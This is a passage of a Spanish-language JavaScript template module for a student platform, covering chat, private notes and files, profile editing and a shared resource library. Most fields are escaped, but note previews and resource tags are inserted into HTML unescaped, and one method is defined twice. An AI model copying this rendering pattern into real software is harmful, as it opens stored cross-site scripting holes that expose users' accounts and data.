                    <svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                    </svg>
                    <p>No hay mensajes aún</p>
                    <p class="text-sm text-gray-400 mt-1">¡Envía el primer mensaje!</p>
                </div>
            `;
        }

        const currentUserId = window.App.state.user.id;
        
        return messages.map(msg => {
            const isOwnMessage = msg.sender_id == currentUserId;
            
            return /*html*/`
                <div class="flex ${isOwnMessage ? 'justify-end' : 'justify-start'}">
                    <div class="max-w-xs lg:max-w-md ${isOwnMessage ? 'bg-blue-500 text-white' : 'bg-white border border-gray-200'} rounded-2xl p-3 shadow-sm">
                        ${!isOwnMessage ? /*html*/`
                            <p class="text-xs font-medium mb-1 text-gray-600">${esc(msg.sender_name)}</p>
                        ` : ''}
                        <p class="text-sm">${esc(msg.message)}</p>
                        <p class="text-xs ${isOwnMessage ? 'text-blue-100' : 'text-gray-500'} mt-1 text-right">
                            ${new Date(msg.timestamp).toLocaleTimeString()}
                        </p>
                    </div>
                </div>
            `;
        }).join('');
    },

    /**
     * Dibuja el contenido de Anotaciones FUNCIONAL
     */
    notesContent(privateResources = []) {
        const notes = privateResources.filter(r => r.type === 'note');
        const files = privateResources.filter(r => r.type === 'file');
        
        return /*html*/`
        <div class="max-w-7xl mx-auto animate-fade-in">
            <header class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
                <div class="text-center md:text-left">
                    <h1 class="text-4xl font-bold text-gray-800 mb-2 bg-gradient-to-r from-orange-600 to-orange-800 bg-clip-text text-transparent">
                        📝 Mis Anotaciones
                    </h1>
                    <p class="text-gray-600">Tus recursos y notas privadas</p>
                </div>
                <div class="flex gap-3">
                    <button id="create-note-btn" class="group flex items-center justify-center gap-3 bg-gradient-to-r from-orange-500 to-orange-600 text-white py-3 px-6 rounded-xl font-semibold shadow-lg hover:from-orange-600 hover:to-orange-700 transform hover:scale-105 hover:shadow-xl transition-all duration-300">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path>
                        </svg>
                        <span>Nueva Nota</span>
                    </button>
                    <button id="upload-private-file-btn" class="group flex items-center justify-center gap-3 bg-gradient-to-r from-blue-500 to-blue-600 text-white py-3 px-6 rounded-xl font-semibold shadow-lg hover:from-blue-600 hover:to-blue-700 transform hover:scale-105 hover:shadow-xl transition-all duration-300">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                        </svg>
                        <span>Subir Archivo</span>
                    </button>
                </div>
            </header>

            <!-- Pestañas para Notas y Archivos -->
            <div class="mb-6">
                <div class="border-b border-gray-200">
                    <nav class="flex space-x-8">
                        <button class="notes-tab py-4 px-1 border-b-2 font-medium text-sm border-orange-500 text-orange-600" data-tab="notes">
                            📝 Notas (${notes.length})
                        </button>
                        <button class="notes-tab py-4 px-1 border-b-2 font-medium text-sm border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300" data-tab="files">
                            📁 Archivos (${files.length})
                        </button>
                    </nav>
                </div>
            </div>

            <!-- Contenido de Notas -->
            <div id="notes-tab-content" class="notes-tab-content">
                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                    ${notes.length > 0 ? notes.map(note => this.noteCard(note)).join('') : ''}
                    
                    <!-- Anotación vacía para crear nueva -->
                    <div id="create-note-placeholder" class="bg-white rounded-2xl shadow-lg p-6 border-2 border-dashed border-gray-300 flex flex-col items-center justify-center text-center hover:border-orange-400 transition-colors duration-300 cursor-pointer min-h-[200px]">
                        <svg class="w-12 h-12 text-gray-400 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path>
                        </svg>
                        <p class="text-gray-600 mb-2">Crea tu primera anotación</p>
                        <p class="text-sm text-gray-500">Organiza tus ideas y recursos</p>
                    </div>
                </div>
            </div>

            <!-- Contenido de Archivos -->
            <div id="files-tab-content" class="notes-tab-content hidden">
                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                    ${files.length > 0 ? files.map(file => this.fileCard(file)).join('') : ''}
                    
                    <!-- Archivo vacío para subir nuevo -->
                    <div id="upload-file-placeholder" class="bg-white rounded-2xl shadow-lg p-6 border-2 border-dashed border-gray-300 flex flex-col items-center justify-center text-center hover:border-blue-400 transition-colors duration-300 cursor-pointer min-h-[200px]">
                        <svg class="w-12 h-12 text-gray-400 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                        </svg>
                        <p class="text-gray-600 mb-2">Sube tu primer archivo</p>
                        <p class="text-sm text-gray-500">Mantén tus archivos organizados</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Modal para crear/editar nota -->
        <div id="note-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 z-40 flex items-center justify-center p-4 backdrop-blur-sm">
            <div class="bg-white rounded-2xl shadow-2xl w-full max-w-2xl transform animate-modal-in max-h-[90vh] overflow-y-auto">
                <div class="flex justify-between items-center p-6 border-b border-gray-200">
                    <h3 class="text-xl font-bold text-gray-900" id="note-modal-title">Nueva Nota</h3>
                    <button type="button" id="close-note-modal" class="text-gray-400 hover:text-gray-600 transform hover:scale-110 transition-all duration-200">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </button>
                </div>
                
                <form id="note-form" class="p-6 space-y-4">
                    <input type="hidden" id="note-id">
                    <div>
                        <label for="note-title" class="block text-sm font-semibold text-gray-700 mb-2">Título *</label>
                        <input type="text" 
                               id="note-title" 
                               class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-orange-500 focus:ring-2 focus:ring-orange-200 transition-all duration-300" 
                               placeholder="Título de la nota"
                               required>
                    </div>

                    <div>
                        <label for="note-content" class="block text-sm font-semibold text-gray-700 mb-2">Contenido</label>
                        <textarea 
                            id="note-content" 
                            class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-orange-500 focus:ring-2 focus:ring-orange-200 transition-all duration-300" 
                            placeholder="Escribe tu nota aquí..."
                            rows="10"></textarea>
                    </div>
                </form>
                
                <div class="flex justify-end space-x-3 p-6 border-t border-gray-200">
                    <button type="button" id="cancel-note-modal" class="bg-white py-3 px-6 rounded-lg border-2 border-gray-300 text-sm font-semibold text-gray-700 hover:bg-gray-50 hover:border-gray-400 transform hover:scale-105 transition-all duration-300">
                        Cancelar
                    </button>
                    <button type="submit" form="note-form" class="bg-gradient-to-r from-orange-500 to-orange-600 text-white py-3 px-6 rounded-lg text-sm font-semibold shadow-lg hover:from-orange-600 hover:to-orange-700 transform hover:scale-105 hover:shadow-xl transition-all duration-300">
                        Guardar Nota
                    </button>
                </div>
            </div>
        </div>
        `;
    },

    /**
     * Dibuja una tarjeta de nota
     */
    noteCard(note) {
        const shortContent = note.content && note.content.length > 100 
            ? note.content.substring(0, 100) + '...' 
            : note.content;
            
        return /*html*/`
        <div class="bg-yellow-50 border-l-4 border-yellow-400 rounded-lg p-5 shadow-md hover:shadow-lg transition-all duration-300 transform hover:scale-[1.02] note-card" data-note-id="${note.id}">
            <div class="flex items-center justify-between mb-3">
                <h3 class="font-bold text-gray-800 text-lg">${esc(note.title)}</h3>
                <span class="text-xs bg-yellow-100 text-yellow-800 px-2 py-1 rounded-full">Nota</span>
            </div>
            <p class="text-sm text-gray-600 mb-4 min-h-[60px]">${shortContent || 'Sin contenido'}</p>
            <div class="flex items-center justify-between text-xs text-gray-500">
                <span>${new Date(note.updated_at).toLocaleDateString()}</span>
                <div class="flex gap-1">
                    <button class="text-blue-600 hover:text-blue-800 edit-note-btn" data-note-id="${note.id}">Editar</button>
                    <button class="text-red-600 hover:text-red-800 delete-note-btn" data-note-id="${note.id}">Eliminar</button>
                </div>
            </div>
        </div>
        `;
    },

    /**
     * Dibuja una tarjeta de archivo privado
     */
    fileCard(file) {
        return /*html*/`
        <div class="bg-blue-50 border-l-4 border-blue-400 rounded-lg p-5 shadow-md hover:shadow-lg transition-all duration-300 transform hover:scale-[1.02] file-card" data-file-id="${file.id}">
            <div class="flex items-center justify-between mb-3">
                <h3 class="font-bold text-gray-800 text-lg">${esc(file.title)}</h3>
                <span class="text-xs bg-blue-100 text-blue-700 px-2 py-1 rounded-full">Archivo</span>
            </div>
            <div class="flex items-center gap-2 mb-4">
                <svg class="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                </svg>
                <span class="text-sm text-gray-600">${esc(file.original_filename || file.filename)}</span>
            </div>
            <div class="flex items-center justify-between text-xs text-gray-500">
                <span>${new Date(file.updated_at).toLocaleDateString()}</span>
                <div class="flex gap-1">
                    <button type="button"
                       class="download-protected-btn text-blue-600 hover:text-blue-800"
                       data-private-id="${file.id}"
                       data-filename="${esc(file.original_filename || file.filename)}">
                        Descargar
                    </button>
                    <button class="text-red-600 hover:text-red-800 delete-file-btn" data-file-id="${file.id}">Eliminar</button>
                </div>
            </div>
        </div>
        `;
    },

    /**
 * Dibuja el contenido de Perfil CON SELECTOR DE COLOR EDITABLE
 */
profileContent(user, userStats = {}) {
    // Función para generar iniciales
    const getInitials = (name) => {
        if (!name) return 'U';
        return name.split(' ').map(word => word.charAt(0).toUpperCase()).join('').substring(0, 2);
    };
    
    const initials = getInitials(user.name);
    const profileColor = user.profile_color || '#3B82F6';

    return /*html*/`
    <div class="max-w-4xl mx-auto animate-fade-in">
        <header class="text-center mb-8">
            <h1 class="text-4xl font-bold text-gray-800 mb-2 bg-gradient-to-r from-indigo-600 to-indigo-800 bg-clip-text text-transparent">
                👤 Mi Perfil
            </h1>
            <p class="text-gray-600">Gestiona tu información personal</p>
        </header>

        <div class="bg-white rounded-2xl shadow-lg p-8">
            <div class="flex flex-col md:flex-row items-center gap-6 mb-8">
                <!-- Avatar con color dinámico -->
                <div class="relative">
                    <div class="w-24 h-24 rounded-full flex items-center justify-center text-white text-2xl font-bold shadow-lg mb-4" 
                         style="background-color: ${profileColor}" id="profile-avatar-preview">
                        ${initials}
                    </div>
                </div>
                <div class="text-center md:text-left">
                    <h2 class="text-2xl font-bold text-gray-800">${esc(user.name || 'Usuario')}</h2>
                    <p class="text-gray-600">Estudiante UFG</p>
                    <p class="text-sm text-gray-500">${esc(user.email || 'No especificado')}</p>
                    <div class="flex items-center gap-2 mt-1">
                        <div class="w-3 h-3 rounded-full" style="background-color: ${profileColor}"></div>
                        <span class="text-xs text-gray-500">Color actual del avatar</span>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                <!-- Información Personal -->
                <div class="space-y-6">
                    <h3 class="font-bold text-gray-800 text-lg border-b pb-2">Información Personal</h3>
                    <form id="profile-form" class="space-y-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-2">Nombre Completo *</label>
                            <input type="text" 
                                   id="profile-name" 
                                   value="${esc(user.name || '')}" 
                                   class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 transition-all duration-300"
                                   placeholder="Tu nombre completo"
                                   required>
                        </div>
                        
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-2">Carrera</label>
                            <select id="profile-career" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 transition-all duration-300 bg-white">
                                <option value="">Seleccionar carrera</option>
                                <option value="Ingeniería en Sistemas" ${user.career === 'Ingeniería en Sistemas' ? 'selected' : ''}>Ingeniería en Sistemas</option>
                                <option value="Administración de Empresas" ${user.career === 'Administración de Empresas' ? 'selected' : ''}>Administración de Empresas</option>
                                <option value="Derecho" ${user.career === 'Derecho' ? 'selected' : ''}>Derecho</option>
                                <option value="Psicología" ${user.career === 'Psicología' ? 'selected' : ''}>Psicología</option>
                                <option value="Ingeniería Civil" ${user.career === 'Ingeniería Civil' ? 'selected' : ''}>Ingeniería Civil</option>
                                <option value="Medicina" ${user.career === 'Medicina' ? 'selected' : ''}>Medicina</option>
                                <option value="Arquitectura" ${user.career === 'Arquitectura' ? 'selected' : ''}>Arquitectura</option>
                                <option value="Contaduría Pública" ${user.career === 'Contaduría Pública' ? 'selected' : ''}>Contaduría Pública</option>
                            </select>
                        </div>
                        
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-2">Semestre</label>
                            <input type="number" 
                                   id="profile-semester" 
                                   value="${esc(user.semester || '')}" 
                                   min="1" max="12"
                                   class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 transition-all duration-300"
                                   placeholder="Ej: 5">
                        </div>
                    </form>
                </div>

                <!-- Selector de Color del Avatar -->
                <div class="space-y-6">
                    <h3 class="font-bold text-gray-800 text-lg border-b pb-2">Color de tu Avatar</h3>
                    <div class="bg-gray-50 rounded-xl p-6">
                        <p class="text-sm text-gray-600 mb-4 text-center">
                            Selecciona un color para personalizar tu avatar en toda la plataforma
                        </p>
                        
                        <div class="grid grid-cols-4 gap-4 mb-6">
                            ${this.getEditableColorOptions(user.profile_color)}
                        </div>
                        
                        <div class="text-center p-4 bg-white rounded-lg border-2 border-dashed border-gray-200">
                            <p class="text-sm font-medium text-gray-700 mb-2">Vista previa:</p>
                            <div class="flex justify-center">
                                <div class="w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-lg shadow-lg" 
                                     style="background-color: ${profileColor}" id="color-preview">
                                    ${initials}
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Estadísticas -->
                    <div class="space-y-4">
                        <h3 class="font-bold text-gray-800 text-lg border-b pb-2">Mi Actividad</h3>
                        <div class="grid grid-cols-2 gap-4">
                            <div class="bg-indigo-50 rounded-lg p-4 text-center transform transition-all duration-300 hover:scale-105">
                                <div class="text-2xl font-bold text-indigo-600">${userStats.resources_count || 0}</div>
                                <div class="text-sm text-indigo-700">Recursos</div>
                            </div>
                            <div class="bg-green-50 rounded-lg p-4 text-center transform transition-all duration-300 hover:scale-105">
                                <div class="text-2xl font-bold text-green-600">${userStats.groups_count || 0}</div>
                                <div class="text-sm text-green-700">Grupos</div>
                            </div>
                            <div class="bg-purple-50 rounded-lg p-4 text-center transform transition-all duration-300 hover:scale-105">
                                <div class="text-2xl font-bold text-purple-600">${userStats.contacts_count || 0}</div>
                                <div class="text-sm text-purple-700">Contactos</div>
                            </div>
                            <div class="bg-orange-50 rounded-lg p-4 text-center transform transition-all duration-300 hover:scale-105">
                                <div class="text-2xl font-bold text-orange-600">${userStats.notes_count || 0}</div>
                                <div class="text-sm text-orange-700">Anotaciones</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="mt-8 flex justify-end gap-3 pt-6 border-t border-gray-200">
                <button type="button" id="cancel-profile-btn" class="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-all duration-300 transform hover:scale-105">
                    Cancelar
                </button>
                <button type="button" id="save-profile-btn" class="px-6 py-3 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-all duration-300 transform hover:scale-105 shadow-lg">
                    💾 Guardar Cambios
                </button>
            </div>
        </div>
    </div>
    `;
},

/**
 * Modal para ver perfil de contacto
 */
contactProfileModal(contactUser) {
    // Función para generar iniciales
    const getInitials = (name) => {
        if (!name) return 'U';
        return name.split(' ').map(word => word.charAt(0).toUpperCase()).join('').substring(0, 2);
    };
    
    const initials = getInitials(contactUser.name);
    const profileColor = contactUser.profile_color || '#3B82F6';
    
    return /*html*/`
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-md transform animate-modal-in">
        <!-- Encabezado -->
        <div class="flex justify-between items-center p-6 border-b border-gray-200">
            <h3 class="text-xl font-bold text-gray-900">👤 Perfil de Contacto</h3>
            <button type="button" class="close-contact-profile-modal text-gray-400 hover:text-gray-600 transform hover:scale-110 transition-all duration-200">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
            </button>
        </div>
        
        <!-- Contenido del Perfil -->
        <div class="p-6">
            <!-- Avatar y Información Básica -->
            <div class="flex flex-col items-center text-center mb-6">
                <div class="w-20 h-20 rounded-full flex items-center justify-center text-white text-2xl font-bold shadow-lg mb-4" 
                     style="background-color: ${profileColor}">
                    ${initials}
                </div>
                <h2 class="text-2xl font-bold text-gray-800">${esc(contactUser.name)}</h2>
                <p class="text-gray-600">${esc(contactUser.career || 'Carrera no especificada')}</p>
                <p class="text-sm text-gray-500">${esc(contactUser.email)}</p>
            </div>
            
            <!-- Información Académica -->
            <div class="bg-gray-50 rounded-xl p-4 mb-4">
                <h4 class="font-semibold text-gray-800 mb-3">📚 Información Académica</h4>
                <div class="space-y-2">
                    <div class="flex justify-between">
                        <span class="text-sm text-gray-600">Carrera:</span>
                        <span class="text-sm font-medium text-gray-800">${esc(contactUser.career || 'No especificada')}</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-sm text-gray-600">Semestre:</span>
                        <span class="text-sm font-medium text-gray-800">${contactUser.semester ? `Semestre ${contactUser.semester}` : 'No especificado'}</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-sm text-gray-600">Miembro desde:</span>
                        <span class="text-sm font-medium text-gray-800">${new Date(contactUser.created_at).toLocaleDateString()}</span>
                    </div>
                </div>
            </div>
            
            <!-- Estadísticas -->
            <div class="bg-blue-50 rounded-xl p-4">
                <h4 class="font-semibold text-gray-800 mb-3">📊 Actividad en la Plataforma</h4>
                <div class="grid grid-cols-2 gap-3">
                    <div class="text-center">
                        <div class="text-lg font-bold text-blue-600">${contactUser.stats?.resources_count || 0}</div>
                        <div class="text-xs text-blue-700">Recursos</div>
                    </div>
                    <div class="text-center">
                        <div class="text-lg font-bold text-green-600">${contactUser.stats?.groups_count || 0}</div>
                        <div class="text-xs text-green-700">Grupos</div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Pie del Modal -->
        <div class="flex justify-end p-6 border-t border-gray-200">
            <button type="button" class="close-contact-profile-modal bg-blue-600 text-white py-2 px-6 rounded-lg text-sm font-medium hover:bg-blue-700 transition-colors duration-200">
                Cerrar
            </button>
        </div>
    </div>
    `;
},

/**
 * Genera las opciones de color EDITABLES para el perfil
 */
getEditableColorOptions(selectedColor = '#3B82F6') {
    const colors = [
        { value: '#3B82F6', name: 'Azul', class: 'bg-blue-500' },
        { value: '#EF4444', name: 'Rojo', class: 'bg-red-500' },
        { value: '#10B981', name: 'Verde', class: 'bg-green-500' },
        { value: '#F59E0B', name: 'Ámbar', class: 'bg-yellow-500' },
        { value: '#8B5CF6', name: 'Violeta', class: 'bg-purple-500' },
        { value: '#EC4899', name: 'Rosa', class: 'bg-pink-500' },
        { value: '#06B6D4', name: 'Cian', class: 'bg-cyan-500' },
        { value: '#F97316', name: 'Naranja', class: 'bg-orange-500' }
    ];

    return colors.map(color => /*html*/`
        <label class="flex flex-col items-center cursor-pointer group">
            <input type="radio" name="profile_color_edit" value="${color.value}" 
                   class="hidden peer color-radio" 
                   ${color.value === selectedColor ? 'checked' : ''}>
            <div class="w-12 h-12 ${color.class} rounded-full flex items-center justify-center text-white font-bold text-sm shadow-lg transform transition-all duration-300 group-hover:scale-110 peer-checked:ring-4 peer-checked:ring-offset-2 peer-checked:ring-indigo-400">
                <span class="opacity-0 peer-checked:opacity-100 transition-opacity duration-300">✓</span>
            </div>
            <span class="text-xs text-gray-600 mt-2 font-medium">${esc(color.name)}</span>
        </label>
    `).join('');
},

/**
 * Genera las opciones de color EDITABLES para el perfil
 */
getEditableColorOptions(selectedColor = '#3B82F6') {
    const colors = [
        { value: '#3B82F6', name: 'Azul', class: 'bg-blue-500' },
        { value: '#EF4444', name: 'Rojo', class: 'bg-red-500' },
        { value: '#10B981', name: 'Verde', class: 'bg-green-500' },
        { value: '#F59E0B', name: 'Ámbar', class: 'bg-yellow-500' },
        { value: '#8B5CF6', name: 'Violeta', class: 'bg-purple-500' },
        { value: '#EC4899', name: 'Rosa', class: 'bg-pink-500' },
        { value: '#06B6D4', name: 'Cian', class: 'bg-cyan-500' },
        { value: '#F97316', name: 'Naranja', class: 'bg-orange-500' }
    ];

    return colors.map(color => /*html*/`
        <label class="flex flex-col items-center cursor-pointer group">
            <input type="radio" name="profile_color_edit" value="${color.value}" 
                   class="hidden peer color-radio" 
                   ${color.value === selectedColor ? 'checked' : ''}>
            <div class="w-12 h-12 ${color.class} rounded-full flex items-center justify-center text-white font-bold text-sm shadow-lg transform transition-all duration-300 group-hover:scale-110 peer-checked:ring-4 peer-checked:ring-offset-2 peer-checked:ring-indigo-400">
                <span class="opacity-0 peer-checked:opacity-100 transition-opacity duration-300">✓</span>
            </div>
            <span class="text-xs text-gray-600 mt-2 font-medium">${esc(color.name)}</span>
        </label>
    `).join('');
},

    /**
     * Dibuja el contenido de la Biblioteca FUNCIONAL
     */
    libraryContent(resources, currentUserId) {
        return /*html*/`
        <div class="max-w-7xl mx-auto animate-fade-in">
            <header class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
                <div class="text-center md:text-left">
                    <h1 class="text-4xl font-bold text-gray-800 mb-2 bg-gradient-to-r from-blue-600 to-blue-800 bg-clip-text text-transparent">Biblioteca Compartida</h1>
                    <p class="text-gray-600">Comparte y descubre recursos académicos</p>
                </div>
                <button id="add-resource-btn" class="group w-full md:w-auto flex items-center justify-center gap-3 bg-gradient-to-r from-blue-500 to-blue-600 text-white py-3 px-6 rounded-xl font-semibold shadow-lg hover:from-blue-600 hover:to-blue-700 transform hover:scale-105 hover:shadow-xl transition-all duration-300">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 transform group-hover:rotate-90 transition-transform duration-300" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd" d="M10 3a1 1 0 011 1v5h5a1 1 0 110 2h-5v5a1 1 0 11-2 0v-5H4a1 1 0 110-2h5V4a1 1 0 011-1z" clip-rule="evenodd" />
                    </svg>
                    <span>Añadir Recurso</span>
                </button>
            </header>
            
            <!-- Barra de Búsqueda -->
            <div class="mb-6 transform transition-all duration-300 hover:scale-[1.01]">
                <div class="relative">
                    <svg class="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
                    </svg>
                    <input type="search" id="search-bar" class="w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-xl focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-300 placeholder-gray-400" placeholder="Buscar por título, autor, etiquetas...">
                </div>
            </div>

            <!-- Contenedor de la Tabla -->
            <div class="bg-white rounded-2xl shadow-lg overflow-hidden transform transition-all duration-300 hover:shadow-xl">
                <div class="overflow-x-auto">
                    <table class="w-full min-w-[700px]">
                        <thead class="bg-gradient-to-r from-gray-50 to-blue-50">
                            <tr>
                                <th class="p-4 text-left text-xs font-bold text-gray-600 uppercase tracking-wider">Título</th>
                                <th class="p-4 text-left text-xs font-bold text-gray-600 uppercase tracking-wider">Autor(es)</th>
                                <th class="p-4 text-left text-xs font-bold text-gray-600 uppercase tracking-wider">Subido por</th>
                                <th class="p-4 text-left text-xs font-bold text-gray-600 uppercase tracking-wider">Archivo</th>
                                <th class="p-4 text-left text-xs font-bold text-gray-600 uppercase tracking-wider">Acciones</th>
                            </tr>
                        </thead>
                        <tbody id="resource-table-body" class="divide-y divide-gray-100">
                            ${this.resourceTableRows(resources, currentUserId)}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        `;
    },

    /**
     * Dibuja las filas de la tabla de recursos
     */
    resourceTableRows(resources, currentUserId) {
        if (!resources || resources.length === 0) {
            return /*html*/`
                <tr>
                    <td colspan="5" class="p-8 text-center text-gray-500">
                        <div class="flex flex-col items-center justify-center py-8">
                            <svg class="w-16 h-16 text-gray-300 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                            </svg>
                            <p class="text-lg font-medium text-gray-500 mb-2">Aún no hay recursos</p>
                            <p class="text-gray-400">¡Sé el primero en compartir conocimiento!</p>
                        </div>
                    </td>
                </tr>
            `;
        }

        return resources.map(resource => {
            const isOwner = resource.owner_id === currentUserId;
            const fileUrl = `${config.API_URL}/api/uploads/${encodeURIComponent(resource.filename)}`; 
            
            const tagsHtml = (resource.tags || '')
                .split(',')
                .filter(tag => tag.trim() !== '')
                .map(tag => `<span class="inline-block bg-blue-100 text-blue-700 text-xs font-medium px-3 py-1 rounded-full mr-2 mb-2 transform transition-transform duration-200 hover:scale-105">${tag.trim()}</span>`)
                .join('');

            return /*html*/`
            <tr class="hover:bg-blue-50 transition-colors duration-200 group">
                <td class="p-4 align-top">
                    <div class="font-semibold text-gray-900 group-hover:text-blue-700 transition-colors duration-200">${esc(resource.title)}</div>
                    <div class="text-sm text-gray-500 mt-1">${esc(resource.category)}</div>
                    <div class="mt-3">
                        ${tagsHtml || '<span class="text-xs text-gray-400 italic">Sin etiquetas</span>'}
                    </div>
                </td>
                <td class="p-4 text-sm text-gray-700 align-top">${esc(resource.author)}</td>
                <td class="p-4 text-sm text-gray-700 align-top">${esc(resource.owner_name)}</td>
                <td class="p-4 text-sm align-top">
                    <a href="${fileUrl}" target="_blank" class="inline-flex items-center gap-1 text-blue-600 hover:text-blue-800 font-medium transition-colors duration-200 transform hover:scale-105">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
                        </svg>
                        Ver Archivo
                    </a>
                </td>
                <td class="p-4 text-sm align-top">
                    ${isOwner ? /*html*/`
                    <div class="flex gap-2">
                        <button class="flex items-center gap-1 text-yellow-600 hover:text-yellow-800 font-medium transition-colors duration-200 transform hover:scale-105 edit-resource-btn" data-id="${resource.id}">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path>
                            </svg>
                            Editar
                        </button>
                        <button class="flex items-center gap-1 text-red-600 hover:text-red-800 font-medium transition-colors duration-200 transform hover:scale-105 delete-resource-btn" data-id="${resource.id}">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
                            </svg>
                            Eliminar
                        </button>
                    </div>
                    ` : '<span class="text-xs text-gray-400 italic">Solo lectura</span>'}
                </td>
            </tr>
            `;
        }).join('');
    },

    /**
     * Modal para recursos (compartido entre biblioteca y recursos privados)
     */
    resourceModal(resource = null, currentUserName = '', isPrivate = false) {
        const isEdit = resource !== null;
        const title = isEdit ? 'Editar Recurso' : (isPrivate ? 'Subir Archivo Privado' : 'Añadir Recurso');
        
        const defaultAuthor = isEdit ? resource.author : currentUserName;
        
        const inputClasses = "w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-300 placeholder-gray-400";
        const selectClasses = "w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-300 bg-white";
        
        const categories = [
            {
